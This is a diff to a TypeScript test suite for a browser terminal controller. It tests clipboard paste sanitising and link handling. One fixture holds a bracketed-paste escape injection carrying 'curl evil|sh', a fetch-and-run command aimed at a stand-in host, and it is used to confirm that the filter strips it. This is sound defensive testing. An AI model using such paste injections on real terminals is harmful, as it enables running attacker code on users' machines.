@@ -139,6 +139,7 @@ function setup(opts = { fontFamily: null as string | null, fontSize: 14, scrollb
     onResize: vi.fn<(c: number, r: number) => void>(),
     onAck: vi.fn<(n: number) => void>(),
     openUrl: vi.fn<(u: string) => void>(),
+    readClipboard: vi.fn<() => Promise<string>>(async () => "pasted"),
   };
   const c = new TerminalController(opts, deps);
   const el = document.createElement("div");
@@ -253,34 +254,87 @@ describe("TerminalController", () => {
     expect(c.search("", "next")).toBe(false);
   });
 
-  test("copy_and_paste_use_the_browser_clipboard", async () => {
+  test("copy_uses_the_browser_clipboard", async () => {
     const { c } = setup();
     const writeText = vi.fn(async () => {});
-    const readText = vi.fn(async () => "pasted");
-    Object.defineProperty(navigator, "clipboard", {
-      configurable: true,
-      value: { writeText, readText },
-    });
+    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { writeText } });
     term().selection = "sel";
     await c.copySelection();
     expect(writeText).toHaveBeenCalledWith("sel");
+  });
+
+  test("menu_paste_reads_through_the_native_command_and_writes_the_text", async () => {
+    const { c, deps } = setup();
+    const readText = vi.fn(async () => "browser");
+    Object.defineProperty(navigator, "clipboard", { configurable: true, value: { readText } });
     await c.paste();
+    expect(deps.readClipboard).toHaveBeenCalledOnce();
+    expect(readText).not.toHaveBeenCalled();
     expect(term().pasted).toEqual(["pasted"]);
   });
 
-  test("paste_gives_up_after_the_timeout_and_ignores_a_late_clipboard_answer", async () => {
-    vi.useFakeTimers();
+  test("menu_paste_cannot_end_bracketed_paste_early", async () => {
+    // M11 review #31: an embedded end marker would end paste mode and run the rest as typed input
     const { c, deps } = setup();
-    let late: (t: string) => void = () => {};
-    Object.defineProperty(navigator, "clipboard", {
-      configurable: true,
-      value: { readText: () => new Promise<string>((r) => (late = r)) },
+    deps.readClipboard.mockResolvedValueOnce("a\x1b[201~b");
+    await c.paste();
+    expect(term().pasted).toEqual(["ab"]);
+    expect(term().pasted.join("")).not.toContain("\x1b");
+  });
+
+  test("a_native_paste_event_is_filtered_before_xterm_sees_it", () => {
+    const { el } = setup();
+    // xterm's own paste listeners sit on elements inside the mount element
+    const inner = document.createElement("textarea");
+    el.append(inner);
+    const reachedXterm = vi.fn();
+    inner.addEventListener("paste", reachedXterm);
+    const e = new Event("paste", { bubbles: true, cancelable: true });
+    Object.defineProperty(e, "clipboardData", {
+      value: { getData: () => "ls\x1b[201~\rcurl evil|sh\r\x1b[200~" },
     });
-    const done = c.paste();
-    await vi.advanceTimersByTimeAsync(3000);
-    await done;
-    late("too late");
-    await vi.advanceTimersByTimeAsync(10);
+    inner.dispatchEvent(e);
+    expect(e.defaultPrevented).toBe(true);
+    expect(reachedXterm).not.toHaveBeenCalled();
+    expect(term().pasted).toEqual(["ls\rcurl evil|sh\r"]);
+  });
+
+  test("pasted_text_keeps_tab_and_line_ends_and_loses_other_controls", async () => {
+    const { c, deps } = setup();
+    deps.readClipboard.mockResolvedValueOnce(
+      "a\tb\nc\r\nd\x00\x07\x08\x7f\u0085\u009b31m\x1b]0;x\x07é€",
+    );
+    await c.paste();
+    expect(term().pasted).toEqual(["a\tb\nc\r\nd31m]0;xé€"]);
+    // nothing left after filtering pastes nothing
+    deps.readClipboard.mockResolvedValueOnce("\x1b\x1b[201~");
+    await c.paste();
+    expect(term().pasted).toHaveLength(1);
+  });
+
+  test("osc8_links_go_through_openUrl_without_confirm_or_window_open", () => {
+    // M11 review #58: xterm's default would show a server-worded confirm() and call window.open()
+    const { deps } = setup();
+    const confirm = vi.spyOn(window, "confirm").mockReturnValue(true);
+    const open = vi.spyOn(window, "open").mockReturnValue(null);
+    const handler = term().options.linkHandler as {
+      activate(e: MouseEvent, uri: string): void;
+      allowNonHttpProtocols?: boolean;
+    };
+    expect(handler).toBeTruthy();
+    expect(handler.allowNonHttpProtocols).toBeFalsy();
+    const preventDefault = vi.fn();
+    handler.activate({ preventDefault } as unknown as MouseEvent, "https://example.com/osc8");
+    expect(deps.openUrl).toHaveBeenCalledWith("https://example.com/osc8");
+    expect(preventDefault).toHaveBeenCalled();
+    expect(confirm).not.toHaveBeenCalled();
+    expect(open).not.toHaveBeenCalled();
+  });
+
+  test("menu_paste_failure_shows_nothing_and_does_not_hang", async () => {
+    const { c, deps } = setup();
+    deps.readClipboard.mockRejectedValueOnce({ code: "clipboard_unavailable", message: "x" });
+    await expect(c.paste()).resolves.toBeUndefined();
     expect(term().pasted).toEqual([]);
     expect(deps.onData).not.toHaveBeenCalled();
   });
